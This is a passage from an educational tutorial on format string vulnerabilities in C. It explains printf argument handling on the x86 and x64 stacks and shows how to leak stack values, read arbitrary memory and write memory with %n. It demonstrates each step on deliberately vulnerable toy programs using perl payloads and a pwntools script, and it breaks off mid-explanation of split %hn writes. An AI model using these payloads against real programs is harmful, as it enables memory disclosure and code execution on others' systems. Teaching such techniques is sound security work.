# Format String Vulnerabilities

The format strings vulnerabilities are a kind of vulnerability that can be found
when an user input string is used as the format parameter for functions of the
[printf family](https://www.man7.org/linux/man-pages/man3/printf.3.html), like `printf`, `fprintf` or `sprintf`. When an user is able
to control the format string she could be able to read and write in arbitrary
memory regions, let's see how.

## Printf introduction

The `printf` function is known to be a C function that allows an user to print
characters to the screen based on a format string and a variable number of
arguments. The `printf` function signature is
`int printf(const char *restrict format, ...);` that includes a format string as
first argument and a variable number of subsequent arguments.


> **Note**: You can find the complete description of printf function family in
> [printf(3)](https://www.man7.org/linux/man-pages/man3/printf.3.html).

A common use of the `printf` function is to use the format string to
print a string provided by the user, like:
```c
#include <stdio.h>

void main(int argc, char** argv) {
  char* name = argv[1];
  printf("Hello %s\n", name);
}
```

First, we are going to compile this example for 32 bits with the gcc `-m32`
flag. We will use x86 32 bits programs during this article since format string
vulnerabilities are easier to explain in those, but the concepts can also be
applied to x64 programs.

In order to compile a program for 32 bits in a x64 machine (x86 of 64 bits) we
will need to install [some x86 versions of development tools](https://www.baeldung.com/linux/compile-32-bit-binary-on-64-bit-os#development-tools) to compile it
correctly. In Debian based systems those tools can be installed with
`sudo apt update && sudo apt install -y gcc-multilib build-essential binutils`.

Here is the command to compile the example:
```
$ gcc -g -m32 hello-name.c -o hello-name
```


And this is the result:
```
$ ./hello-name Ada
Hello Ada
```

Nice, we have printed the name by using the `%s` conversion specification, that
prints an string reading its memory address from the arguments. There are other
conversion specifications that are going to be used throughout this article,
that are summarized in the following table:

| Conversion | Description                                            |
|:----------:|:------------------------------------------------------:|
| %x         | Prints an unsigned decimal in hexadecimal              |
| %p         | Prints a pointer                                       |
| %s         | Prints an string                                       |
| %n         | Writes the number of printed characters into a integer |

Apart from its basic notation, this conversion specifications can be added
modifiers to indicate the length of the argument, the format to print, etc. We
can find a more complete explanation in [printf(3)](https://www.man7.org/linux/man-pages/man3/printf.3.html).


## Printf and the stack

We have seen that the name we have provided is printed in the previous program,
but what will happen in the following example?
```c
#include <stdio.h>

void main() {
  printf("Hello %s\n");
}
```

We are telling `printf` to take a string as argument with the `%s` conversion
specification, but there are no arguments. In my machine the output is the
following (yours may differ but should print garbage or even break):
```
$ gcc -g -m32 hello-none.c -o hello-none
$ ./hello-none
Hello ����
```

What is happening here?

The way `printf` works is by taking arguments based on the indications of the
format string. It doesn't really matter if those arguments are actually passed
in the code. In this case the `"Hello %s\n"` string indicates `printf` that it
should take an string (`%s`) from the next argument, so `printf` will take
one. But if we are not passing any more arguments, where does `printf` get these
arguments from? In order to answer we need to understand what is happening under
the hood in the machine code. And specifically we need to understand how the
stack works and the calling conventions used by the CPU architecture and the
operating system.

In case of x86 (32 bits) the arguments are passed by using the stack, so `printf`
will take those from the stack. As example to understand this, we will use the
following program:

```c
// printf-stack.c
#include <stdio.h>

void main() {
    printf("Values: %s, %c, %d %d %d %d\n", "Hello", 'A', 1, 2, 3, 4);
}
```

In the x86 version of the previous program, when `printf` is called the
stack should have the following values (note that values are represented
in little endian):

```
Higher addresses
         |  .........  |
         | ----------- |
         | 04 00 00 00 | = 4
         | ----------- |
         | 03 00 00 00 | = 3
         | ----------- |
         | 02 00 00 00 | = 2
         | ----------- |
         | 01 00 00 00 | = 1
         | ----------- |
         | 41 00 00 00 | = 'A'
         | ----------- |
         | xx xx xx xx | = memory address -> "Hello"
         | ----------- |
         | yy yy yy yy | = memory address -> "Values: %s, %c, %d %d %d %d\n"
         | ----------- |
 esp ->  | zz zz zz zz | = return address
         | ----------- |
         |  .........  |
Lower addresses
```

As we can see, most of the argument values are directly stored in the stack, the
only exception are the strings, that are referenced by inserting their memory
addresses in the stack. The last value value inserted before calling a function
is the return address, which is the memory address of the instruction that the
function must return when it finish.

> **Note**: The *esp* register is known as the stack pointer since it points to
> the top of the stack, which is at the lower address since the stack grows
> downwards.

We can check if our assumption is correct by inspecting the stack when `printf`
is called. For this we are going to compile the program and then use gdb to
inspect it. First we need to set a breakpoint at `printf` function and inspect
the stack when it is reached:
```
$ gcc -m32 printf-stack.c -o printf-stack
$ gdb -q printf-stack
Reading symbols from printf-stack...
(No debugging symbols found in printf-stack)
(gdb) break printf
Breakpoint 1 at 0x1040
(gdb) run
Starting program: /home/ada/printf-stack
...
```

At this point, the program is stopped at the start of the `printf` function so
we can examine the stack:
```
(gdb) x/8wx $esp
0xffffd1cc:	0x565561c7	0x56557010	0x56557008	0x00000041
0xffffd1dc:	0x00000001	0x00000002	0x00000003	0x00000004
```

> **Note**: The `x/8wx` command instructs to print eight word values (4 bytes
> each) in hexadecimal. You can get a complete description by issuing the
> `help x` command inside gdb.

Here we print the first 8 values (4 bytes each value) stored in the stack,
starting from the address pointed by *esp* (the stack pointer). We can spot the
values we have already predicted. In the last positions (the bottom row) the
numbers from 1 to 4, in the previous position the number 0x41 which is the ASCII
value for the character 'A', and at the top of the stack are three values that
seems to be memory addresses, that we suppose that are the return address
(0x565561c7), the format string (0x56557010) and the "Hello" string
(0x56557008). Let's check it.

To print the format string we need to indicate the address of the first argument
which will be the address stored in esp plus 4, that is the size of a pointer,
and for the second it will be esp+8:
```
(gdb) x/s *(char**)($esp+4)
0x56557010:	"Values: %s, %c, %d %d %d %d %d\n"
(gdb) x/s *(char**)($esp+8)
0x56557008:	"Hello"
(gdb) x/c $esp+12
0xffffd1d8:	65 'A'
```

As we predict, those values were the addresses of the strings.I hope this
example allows you to clarify that **in x86 arguments for a function are just
values in the stack**, and in the case of function with variable arguments
like `printf`, is the format string the one that indicates how many argument
should be pulled from the stack, so technically it is possible to create a
format string that allows us to print the whole stack contents.

However the picture changes a bit in case of x64 programs, since the
[x64 GNU/Linux calling convention](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame) establishes that the first six arguments
are passed in the *rdi*, *rsi*, *rdx*, *rcx*, *r8*, *r9* registers and rest in
the stack. This isn't a big deal to print the contents of the stack, but we have
to remember that the first six arguments are taken from registers, not the
stack.

We can check this by just compiling our previous example for x64. In this
occasion the arguments for our printf invocation will be stored the following
places:
```
  Registers:

    rdi = memory address -> "Values: %s, %c, %d %d %d %d\n"
    rsi = memory address -> "Hello"
    rdx = 0x41 = 'A'
    rcx = 0x1
    r8 = 0x2
    r9 = 0x3

  Stack:
         |  .....................  |
         | ----------------------- |
         | 04 00 00 00 00 00 00 00 | = 4
         | ----------------------- |
 rsp ->  | zz zz zz zz zz zz zz zz | = return address
         | ----------------------- |
         |  .....................  |
```

Let's quickly verify this. Same as our previous x86 example, we compile the
program and run it until `printf`:
```
$ gcc printf-stack.c -o printf-stack-64
$ gdb -q printf-stack-64
Reading symbols from printf-stack-64...
(No debugging symbols found in printf-stack-64)
(gdb) break printf
Breakpoint 1 at 0x1030
(gdb) run
Starting program: /home/ada/printf-stack-64
...
```

Then we examine the registers to confirm they store the first six arguments:
```
(gdb) info registers rdi rsi rdx rcx r8 r9
rdi            0x55555555600a      93824992239626
rsi            0x555555556004      93824992239620
rdx            0x41                65
rcx            0x1                 1
r8             0x2                 2
r9             0x3                 3
(gdb) x/s $rdi
0x55555555600a:	"Values: %s, %c, %d %d %d %d\n"
(gdb) x/s $rsi
0x555555556004:	"Hello"
```

As we can see those are our arguments in the registers, including the format
string. The last argument, the integer 4 should be in the stack. Let's examine
it:
```
(gdb) x/8gx $rsp
0x7fffffffe048:	0x0000555555555177	0x0000000000000004
0x7fffffffe058:	0x0000000000000000	0x0000000000000001
0x7fffffffe068:	0x00007ffff7ded24a	0x0000000000000000
0x7fffffffe078:	0x0000555555555139	0x0000000100000000
```

> **Note**: In x64 the stack pointer is called rsp instead of esp.

There it is. Like in our previous example, the first value in the stack is the
return address, but as second value we can appreciate our seventh argument, the
number 4. And in case we change the example code to add more arguments to our
printf invocation, those also will be appended to the stack.

As you see, x64 changes a bit from x86, but it is also possible to exploit
format string vulnerabilities to retrieve the stack contents, as we will see.

> [x64 calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions) also varies between Unix-like systems as GNU/Linux
> and  [Windows](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/windows-x64-calling-convention-stack-frame), that passes the first four arguments in the *rcx*, *rdx*,
> *r8*, *r9* registers and the rest in the stack. We will focus on GNU/Linux
> here, but the techniques can also be applied to other systems.

Let's go back to our x86 example that executes `printf("Hello %s\n");`.
Here is our execution again:
```
$ gcc -g -m32 hello-none.c -o hello-none
$ ./hello-none
Hello ����
```

Now it should be easier for us to explain the behavior of the program. We know
`printf` takes arguments based on the format string. So in this case even if
those were no specified, `printf` will take values from the stack and print
them. In my case the program printed garbage since it took a pointer to a non
string section, like code or other type of variable (and C doesn't care if the
string is actually printable, it will just print every byte until a null
character (0x0) is reached).


## Reading the stack with format strings

Let's try to clarify better how we can read the stack with the following
example, in which we have several local variables and we can provide an
arbitrary format string:
```c
// fsv-intro.c
#include <stdio.h>

void main(int argc, char** argv) {
  int i = 1337;
  char* s = "Hello world!";
  char b[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'};

  printf(argv[1]);
  printf("\n"); // To get a cleaner output
}
```

We must notice that the local variables of a function are stored in the
stack, above the arguments of the called functions. The following diagram
represents how the stack generally looks like when a function is about to be
called (for example when our `main` is calling to `printf`):

```
Higher addresses

  |     ........     |
  | ---------------- |
  |  return address  |
  | ---------------- |
  |   previous ebp   |
  | ---------------- |
  | saved register 1 | \
  | ---------------- |  |
  |     ........     |  |-- saved values of non volatile registers
  | ---------------- |  |
  | saved register n | /
  | ---------------- |
  |    local var 1   | \
  | ---------------- |  |
  |     ........     |  |-- local variables
  | ---------------- |  |
  |    local var n   | /
  | ---------------- |
  | argument padding |
  | ---------------- |
  |    argument n    | \
  | ---------------- |  |
  |     ........     |  |-- arguments
  | ---------------- |  |
  |    argument 1    | /
  | ---------------- |
  |     ........     |

Lower addresses
```

We here have 3 main sections in each stack frame (a frame is the stack section
used by the function context):

- The **preamble** that includes the return address, the previous ebp and the
  saved values of the [non-volatile registers](https://www.techopedia.com/definition/8591/non-volatile-register). The goal of the preamble is
  to preserve all the required values to allow a function to go back to its
  caller in the expected state.
- The **local variables**.
- The **arguments** that are introduced when a child function is about to be
  called, as we have seen previously, along with a padding if it is necessary to
  keep the stack aligned when the new function is called.

Note that not all the stack frame sections are present always, since a function
may not have local variables or is calling functions without arguments, etc.

We can also verify this by inspecting the machine code of our example program
`main` function. First we compile the program:
```
$ gcc -O0 -m32 -g fsv-intro.c  -o fsv-intro
```

> **Note**: The `-O0` option avoids optimizations so the generated assembly is
> more clear and the `-g` option includes debug symbols in the executable.

And then we can use *gdb* to examine the `main` function assembly code:
```bash
$ gdb -q fsv-intro \
    -ex "set pagination off" \
    -ex "set disassembly-flavor intel" \
    -ex "disassemble main" \
    -ex "quit"
Reading symbols from fsv-intro...
Dump of assembler code for function main:
   0x0000118d <+0>:	lea    ecx,[esp+0x4]
   0x00001191 <+4>:	and    esp,0xfffffff0
   0x00001194 <+7>:	push   DWORD PTR [ecx-0x4]
   0x00001197 <+10>:	push   ebp
   0x00001198 <+11>:	mov    ebp,esp
   0x0000119a <+13>:	push   ebx
   0x0000119b <+14>:	push   ecx
   0x0000119c <+15>:	sub    esp,0x10
   0x0000119f <+18>:	call   0x11ea <__x86.get_pc_thunk.ax>
   0x000011a4 <+23>:	add    eax,0x2e50
   0x000011a9 <+28>:	mov    edx,ecx
   0x000011ab <+30>:	mov    DWORD PTR [ebp-0xc],0x539
   0x000011b2 <+37>:	lea    ecx,[eax-0x1fec]
   0x000011b8 <+43>:	mov    DWORD PTR [ebp-0x10],ecx
   0x000011bb <+46>:	mov    DWORD PTR [ebp-0x18],0x44434241
   0x000011c2 <+53>:	mov    DWORD PTR [ebp-0x14],0x48474645
   0x000011c9 <+60>:	mov    edx,DWORD PTR [edx+0x4]
   0x000011cc <+63>:	add    edx,0x4
   0x000011cf <+66>:	mov    edx,DWORD PTR [edx]
   0x000011d1 <+68>:	sub    esp,0xc
   0x000011d4 <+71>:	push   edx
   0x000011d5 <+72>:	mov    ebx,eax
   0x000011d7 <+74>:	call   0x1040 <printf@plt>
   0x000011dc <+79>:	add    esp,0x10
   0x000011df <+82>:	nop
   0x000011e0 <+83>:	lea    esp,[ebp-0x8]
   0x000011e3 <+86>:	pop    ecx
   0x000011e4 <+87>:	pop    ebx
   0x000011e5 <+88>:	pop    ebp
   0x000011e6 <+89>:	lea    esp,[ecx-0x4]
   0x000011e9 <+92>:	ret
End of assembler dump.
```

In this assembly code we can identify the creation of the different
stack frame sections.

The first value, the return address is introduced by the
caller so it is not present in the function code, but we can spot **the preamble
that stores the previous *ebp* and the non-volatile registers** (in this case
*ebx* and *ecx*):
```
   0x00001197 <+10>:	push   ebp
   0x00001198 <+11>:	mov    ebp,esp
   0x0000119a <+13>:	push   ebx
   0x0000119b <+14>:	push   ecx
```

Then we can see how the **stack reserves space for the local variables** and how
their values are introduced in that space, be aware that local variables are
usually referenced in x86 through the *ebp* register:
```
   0x0000119c <+15>:	sub    esp,0x10
   .....
   0x000011ab <+30>:	mov    DWORD PTR [ebp-0xc],0x539
   0x000011b2 <+37>:	lea    ecx,[eax-0x1fec]
   0x000011b8 <+43>:	mov    DWORD PTR [ebp-0x10],ecx
   0x000011bb <+46>:	mov    DWORD PTR [ebp-0x18],0x44434241
   0x000011c2 <+53>:	mov    DWORD PTR [ebp-0x14],0x48474645
```

In this case the instruction `sub esp,0x10` reserves 16 bytes of space, 4 for
`i` variable, 4 for `s` pointer, and 8 for the `b` array. A few instructions
later we can observe how the values are stored in these variables. We can see
that `mov    DWORD PTR [ebp-0xc],0x539` stores the `i` variable (0x539 = 1337),
then a value that we can trace back until the call to [__x86.get_pc_thunk.ax](https://reverseengineering.stackexchange.com/questions/20826/how-does-the-x86-instruction-call-135b-x86-get-pc-thunk-ax-work)
(that is used to retrieve a fixed address from which reference global variables)
is stored in `mov    DWORD PTR [ebp-0x10],ecx` so we can guess is the `s` string
and finally the `b` values are stored in the last two movs.

And finally before calling `printf` the **arguments are introduced in the
stack**:
```
   0x000011d1 <+68>:	sub    esp,0xc
   0x000011d4 <+71>:	push   edx
   0x000011d5 <+72>:	mov    ebx,eax
   0x000011d7 <+74>:	call   0x1040 <printf@plt>
```

Here we can observe how before calling `printf` a padding of 12 bytes is
introduced with `sub esp, 0xc` and the format string argument is pushed onto the
stack with `push edx`.

Therefore, by knowing the local variables are stored in the stack, we know
that when `printf` is called the stack would contain the following
(hexadecimal) values:
```
  | ........... |
  |-------------|
  | 39 05 00 00 | Value 0x539 in little endian = 1337 = i
  |-------------|
  | xx xx xx xx | Memory address of "Hello world!" string = s
  |-------------|
  | 45 46 47 48 | 'E' 'F' 'G' 'H' \
  |-------------|                  | = b
  | 41 42 43 44 | 'A' 'B' 'C' 'D' /
  |-------------|
  | ........... |

```

It is important to know that **sometimes the variables are not
stored in memory in the same order as they are declared in code**. So it is a good
exercise to imagine the stack to have a picture, but it is also important to **be
aware that machine code can change due to optimizations**, so in case of doubt,
check the machine code.

So knowing that local variables are stored in the stack and we can instruct
`printf` to take and print values from the stack through the format string, we
can try to retrieve the values from the local variables. Let's try:
```bash
$ ./fsv-intro "%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|"
f7f297db|f7ceaa4f|5656c1b4|44434241|48474645|5656d008|00000539|
ffa07f00|f7eeaff4|00000000|
```

Here we have used the `%08x` conversion specification repeatedly to extract many
values from the stack. The `%08x` conversion specification indicates that an
unsigned integer must be extracted from the stack and printed in hexadecimal
with at least 8 digits, being padded by 0 at left if necessary. It is important
to note that in x86 an unsigned integer has 4 bytes, that is the size of a
pointer and therefore the (maximum) size of each argument in the stack. If we
tried to print a short int, we will lose the upper half bytes of each value in
the stack. And in case of x64, we should use the `%016lx` conversion
specification, to print values of 8 bytes. Additionally, a maybe easier
alternative is to use the `%p` conversion specification that prints pointers and
can be used in both x86 and x64, but I don't use it because I prefer the output
given by `%x`, but that is a matter of taste.

> **Note**: There are many more conversion specification in printf, you can get
> a complete description in [printf(3)](https://www.man7.org/linux/man-pages/man3/printf.3.html).

Here is the same example with `%p`:

```bash
$ ./fsv-intro "%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|"
0xf7f027db|0xf7cc3a4f|0x566201b4|0x44434241|0x48474645|0x56621008|
0x539|0xffca5350|0xf7ec3ff4|(nil)|
```

As we have predicted, we can see here in the output the values of our local
variables, starting at position 4, after the garbage left by the arguments
padding. We can see the `b` values `0x44434241|0x48474645`, and then the `s`
string pointer `0x56621008` and finally the `i` integer `0x539`. We can verify
that the pointer `s` points to "Hello" string by providing a `%s` conversion
specification in the correct position which is the sixth in this case (may vary
in your machine):

```sh
$ ./fsv-intro "%08x|%08x|%08x|%08x|%08x|%s"
f7ef27db|f7cb3a4f|5658e1b4|44434241|48474645|Hello world!
```

There it is. We can also use a couple of tricks to avoid typing all the repeated
conversions. The first is to use the `%<arg-position>$s` modifier to indicate
which argument must be taken. In our example the string address is located at
the position of the sixth argument, so we can do the following:

```sh
$ ./fsv-intro '%6$s'
Hello world!
```

This can be convenient in certain situations, like when the input we can provide
is restricted to a few characters. The other trick is to generate the format
string with a program, like *perl*. We can use the `print` function of *perl* to
generate a format string in command line:

```sh
$ perl -e 'print "%08x|"x5 . "%s"'
%08x|%08x|%08x|%08x|%08x|%s
```

And we can use this command output as argument to our program:
```sh
$ ./fsv-intro $(perl -e 'print "%08x|"x5 . "%s"')
f7f167db|f7cd7a4f|566031b4|44434241|48474645|Hello world!
```

In this occasion creating the output by using *perl* implies more typing
that using the format string directly, but the advantage of using *perl* is that
this escalates well if want to create a bigger format string:
```sh
$ ./fsv-intro $(perl -e 'print "%08x|"x32')
f7f887db|f7d49a4f|5660c1b4|44434241|48474645|5660d008|00000539|ffcf8eb0|
f7f49ff4|00000000|f7d502d5|00000000|00000070|f7fabff4|f7d502d5|00000002|
ffcf8f64|ffcf8f70|ffcf8ed0|f7f49ff4|5660c19d|00000002|ffcf8f64|f7f49ff4|
5660eeec|f7fabb80|00000000|468bb82d|7393f23d|00000000|00000000|00000000|
```

> **Note**: Apart from *perl*, you could use *python* command to generate
> input. I personally prefer *perl* since python print introduces a newline
> character at the end (you can avoid this by specifying end="" option in print
> but is annoying).

## Reading arbitrary memory with format strings

Therefore, we can inspect the stack by using the `%x` or `%p` conversion
specifications. However, it is also possible to read (and write) other memory
regions as well if the proper conditions are met.

Let's check the following example:
```c
// fsv-global-read.c
#include <stdio.h>

char* flag = "How do you get here?";

int main() {
  char buffer[100] = { 0 };
  printf("flag is at %p\n", flag);

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);
  return 0;
}
```

Here we have a string as global variable (`"How do you get here?"`) that is
outside of the stack, how can we reach it? Well, remember that strings are
referenced by their memory address, so **we can print that string if we are able
to introduce its address into the stack** and then use that address with a `%s`
conversion specification.

How can we introduce its address into the stack? Well, in this example the
format string we provide is stored in the stack, in the variable `buffer`, so
the idea will be to **use our format string to reach our format
string**. Confusing? I know, so let's clarify it with practice. First, as always
we will compile our program:
```
gcc -m32 fsv-global-read.c -o fsv-global-read
```

Then we proceed like in the previous examples, by introducing a format string
that prints many values located in the stack, but since we know our format
string will be stored in the local variable `buffer`, that is present in the
stack, we are going to introduce at the beginning of the string a little
signature that allows us to recognize it (`AAAA`). And remember, in this example
the format string is provided in stdin, not as argument, so we will use a pipe
to provide it in a automatic way:
```sh
$ perl -e 'print "AAAA" . "%08x|"x8' | ./fsv-global-read
flag is at 0x56627008
AAAA00000064|f7f4f620|566261b5|f7fb0ff4|0000002c|00000000|41414141|
78383025|
```

We can locate the beginning of our format string at the seventh position, with
the value `41414141` that represents `AAAA`. Therefore we can set an arbitrary
value at the seventh position (or in the following ones) like a memory address
and try to read from there an string.

We can start by doing a quick test that tries to read the string from the memory
address 'AAAA' aka 0x41414141, that of course will break the program:
```sh
$ echo 'AAAA%7$s' | ./fsv-global-read
flag is at 0x5657a008
Segmentation fault (core dumped)
```

We can see that the program was stopped due to a segmentation fault, surely
caused by our attempt to read from `0x41414141`, an invalid memory
address. Let's be sure by checking it with gdb.

We start the program and provide the input by redirecting our command with
`< <(echo 'AAAA%7$s')` redirection:
```
$ gdb -q ./fsv-global-read
Reading symbols from ./fsv-global-read...
(No debugging symbols found in ./fsv-global-read)
(gdb) r < <(echo 'AAAA%7$s')
Starting program: /home/ada/fsv-global-read < <(echo 'AAAA%7$s')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
flag is at 0x56557008

Program received signal SIGSEGV, Segmentation fault.
__GI_strlen () at ../sysdeps/i386/i586/strlen.S:50
50	../sysdeps/i386/i586/strlen.S: No such file or directory.
```

The program was stopped by the segmentation fault signal again, so let's inspect
what is happening. A good practice to troubleshoot programs is to print the
backtrace, that is the stack of calls until the position we are, the position of
the failure:
```
(gdb) backtrace
#0  __GI_strlen () at ../sysdeps/i386/i586/strlen.S:50
#1  0xf7ddb69b in printf_positional (s=s@entry=0xf7f9bda0 <_IO_2_1_stdout_>,
    format=format@entry=0xffffcfcc "AAAA%7$s\n", readonly_format=readonly_format@entry=0,
    ...stripped...
#2  0xf7ddbf4d in __vfprintf_internal (s=0xf7f9bda0 <_IO_2_1_stdout_>,
    format=0xffffcfcc "AAAA%7$s\n",
    ...stripped...
#3  0xf7dd1f85 in __printf (format=0xffffcfcc "AAAA%7$s\n") ....
#4  0x56556212 in main ()
```

We can appreciate that the segmentation fault was produced inside the `printf`
function, in the invocation of one of its auxiliar functions, that receives by
parameter our format string. Let's now inspect the exact instruction that caused
the failure:
```
(gdb) set disassembly-flavor intel
(gdb) disass
Dump of assembler code for function __GI_strlen:
...stripped...
   0xf7e3466d <+13>:	jp     0xf7e34686 <__GI_strlen+38>
=> 0xf7e3466f <+15>:	cmp    BYTE PTR [eax],dh
   0xf7e34671 <+17>:	je     0xf7e34716 <__GI_strlen+182>
...stripped...
```

We can appreciate that the current instruction is a comparison that tries to
access to the memory address pointed by eax. Let's check the eax value:
```
(gdb) info registers eax
eax            0x41414141          1094795585
```

Here it is, our provided (non) address caused the fault as we imagine. Now we
are sure we can point to the address we want. But what is the address we want to
point? To the address of the global variable. In this ocassion, for the sake of
simplicity, the program tells us which is such address, but in a real worl
scenario this address will be random in each program execution due to [ASLR](https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work)
and we will need to leak a pointer address from the program to calculate the
address in each execution of our target.

So first, we need read the address of the global variable and then introduce such
address at the beginning of our format string. It can be messy to do this in the
command line, so we are going to create a python script that uses the
[pwntools](https://github.com/Gallopsled/pwntools) suite, which is very useful in exploiting.

Here is the script with comments, take your time to read and understand it,
since it is important for understanding the technique but also because pwntools
and python are commonly used so it is important to know how to use them:
```python
from pwn import *

# set the platform of the process we are going to launch
# so functions are adapted to this specific platform
context(arch = 'i386', os = 'linux')

# spawn the process
io = process("./fsv-global-read")

# receive the input
line = io.recvline()
print("Program printed:", line)

# take the hexadecimal value and convert it to a number
addr = int(line[-11:-1], 0)

# convert the addr number into byte characters that represent the value
# make sure context is properly set for this to work correctly
b_addr = pack(addr)
print("Address is {} -> {}".format(hex(addr), b_addr))

# create format string that includes: addr + conversion
format_str = b_addr + b"%7$s"
print("Our format string:", format_str)

# send format string with a newline to help send it properly
# (it returns errors sometimes if newline is not added)
io.sendline(format_str + b"\n")

# Receive the output and redirect to shell
io.stream()
```

To execute the script we need to install [pwntools](https://github.com/Gallopsled/pwntools) in case we don't have
it. A good practice is to create a [python virtual environment](https://opensource.com/article/21/2/python-virtualenvwrapper) and then
install the python packages inside it:
```sh
$ mkvirtualenv fsv
(fsv) $ pip3 install pwntools
```

And then we execute it:
```sh
(fsv) $ python3 fsv-global-read-ex.py
[+] Starting local process './fsv-global-read': pid 5026
Program printed: b'flag is at 0x565f4008\n'
Address is 0x565f4008 -> b'\x08@_V'
Our format string: b'\x08@_V%7$s'
[*] Process './fsv-global-read' stopped with exit code 0 (pid 5026)
\x08@_VHow do you get here?
```

As we can see, the provided address of the global variable is used in our new
format string and then we are able to read it. Success!!

## Writing with format strings

Until this point we have been using the format strings for reading memory, but
what about writing? We can also use the format strings to write with the `%n`
conversion specification, that writes in the given integer the number of
characters printed until the `%n` specifier. It is important to note that it
writes the number of printed characters, not the number of previous characters
in the format string, for example `printf("I'm %s%n", "Hannah", &i)` will print
`I'm Hannah` and write the value 10 into the `i` variable. Also note that the
argument of `%n` is a pointer to an integer, not the integer itself.

Moreover, it is possible to use several `%n` conversion specifications in the
same string, each one writing the number of previous bytes. Here we have a
little example:
```c
// printf-write.c
#include <stdio.h>

void main(int argc, char** argv) {
  int i = 0;
  int x = 0;
  printf("%s%n%s%n\n", argv[1], &i, argv[2], &x);
  printf("i = %d\n", i);
  printf("x = %d\n", x);
}
```

In this example we can provide two strings and the length of the first string
will be set in the `i` variable and the total length will be set in the `x`
variable:
```
$ gcc -m32 printf-write.c -o printf-write
$ ./printf-write abc dfg
abcdfg
i = 3
x = 6
```

As we can see the length of the two strings is accumulated in the `x`
variable. This is an important fact that we will use below to write
huge numbers.

But first, let's start with a simple example. Here we have an integer
an a variable that references our integer (`i_ptr`) located in the
stack, so even if it is not passed as argument to `printf`, we know we
can access to it:
```c
// fsv-write-local.c
#include <stdio.h>

void main(int argc, char** argv) {
  int i = 1337;
  int* i_ptr = &i;

  printf(argv[1]);
  printf("\n");

  printf("i = %d\n", i);
  if (i == 42) {
    printf("You got it!!\n");
  }
}
```

We compile this program with:
```sh
gcc -m32 fsv-write-local.c -o fsv-write-local
```

And the same as previous examples, we starting by printing the values
in stack:
```sh
$ ./fsv-write-local $(perl -e 'print "%08x|"x8')
f7f587db|f7d19a4f|565a01c4|ff92afd0|f7f40688|00000539|ff92af98|ff92afc0|
i = 1337
```

We can locate the value 0x539 (1337) in the sixth position, so we can guess the
previous position is occupied by the `i_ptr` variable. Thus, we can try to provide
a format string that includes 42 characters and then the `%5$n` conversion, that
allow us to access directly to the position in the stack we want:
```sh
$ ./fsv-write-local $(perl -e 'print "A" x 42 . "%5\$n"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
i = 1337
```

But (in my case) it doesn't work! Why? Let's inspect the code
with *gdb*:
```sh
$ gdb -q fsv-write-local \
    -ex "set pagination off" \
    -ex "set disassembly-flavor intel" \
    -ex "disassemble main" -ex "q"
Reading symbols from fsv-write-local...
(No debugging symbols found in fsv-write-local)
Dump of assembler code for function main:
...stripped....
   0x000011cc <+31>:	mov    DWORD PTR [ebp-0x10],0x539
   0x000011d3 <+38>:	lea    edx,[ebp-0x10]
   0x000011d6 <+41>:	mov    DWORD PTR [ebp-0xc],edx
...stripped....
End of assembler dump.
```

Remember that I mention that sometimes variables don't follow the same order in the
stack as they do in their code declaration. Well, this seems to be one of such
cases. If we search for the instructions that initialize the variables we can
see that the variable that stores the 0x539 value is at a lower memory address
(*ebp* - 0x10) than the one that stores the previous variable address
(*ebp* - 0xc). So the `i_ptr` is after the `i`, at the seventh position.

> Be aware that you case can be different and work perfectly at first time or
> maybe there is another cause. Anyway, in case of trouble, you should
> try to debug the program with *gdb* (or the preferred debugger) to
> understand the issue.

With this knowledge we can adjust our format string and retry:
```sh
$ ./fsv-write-local $(perl -e 'print "A" x 42 . "%7\$n"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
i = 42
You got it!!
```

Nice, we were able to write a value in the variable!! This is a little
example, but the principle is the same to overwrite return addresses,
pointers or whatever that granted us code execution when crafting an
exploiting.

Now, let's complicate things a little bit. Here is our next challenge:
```c
// fsv-write-local-big.c
#include <stdio.h>

void main() {
  unsigned int i = 1337;
  char buffer[100] = { 0 };

  printf("i is at: %p\n", &i);
  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);
  printf("\n");

  printf("i = 0x%x\n", i);
  if (i == 0xdeadbeef) {
    printf("You got it!!\n");
  }
}
```

In this occasion we two main differences relative to the previous challenge:

First, the variable `i` is not pointed by any other variables, so its address is
not in the stack, but it is given to us, therefore we can introduce the address
of the variable `i` in our format string, as we have done in previous examples,
since this is stored in the stack.

Second, we can observe that we need to write the value `0xdeadbeef` in `i`. That
is problematic since to write `i` with `%n` we will need to print a huge number
of characters, which is not possible (you can try it but in my experience
`printf` doesn't allow to use `%03735928559x`). The solution here is to divide
`i` in two halves and to write each one of them separately. We can
write the value `0xbeef` first in the lower bytes of `i` and then the
value `0xdead` in the higher bytes, since we know the address of the
higher bytes is the address of `i` plus 2.

Here is a little diagram to represent the addresses of bytes composing
`i`:
```
Memory pointers:

      &i     &i + 2
      v         v
  -----------------------------
  .. | ef | be | ad | de | ..
  -----------------------------

```

Ok, we can write into `&i` and `&i + 2` by inserting those two memory
addresses into our format string, but we still have the problem that `%n`
is designed to write into an unsigned int, that is 4 bytes in size. If we use
`%n` to write into `&i + 2` we will overwrite memory outside the `i` variable,
that could corrupt our program by overwriting other variables or a
[Stack canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries):

```
                 %n over (&i + 2)
                       /\
                -------  ---------
               /                  \
  -----------------------------------
  .. | ef | be | ad | de | 00 | 00 |
  -----------------------------------
                           ^
                        outside i
```

The solution here is to use a [length modifier](https://man.archlinux.org/man/printf.3.en#Length_modifier) that reduces the number of
bytes written by `%n`. Here is a table describing the available sizes:

| Conversion | size (bytes)      |
|:----------:|:-----------------:|
| %hhn       | 1                 |
| %hn        | 2                 |
| %n         | 4                 |
| %ln        | 4 (x86) / 8 (x64) |
| %lln       | 8                 |

This time we will use the `%hn` conversion specification to overwrite just two
bytes in each write.

So, to sum up, the parts of the format string in this case will be the
following:

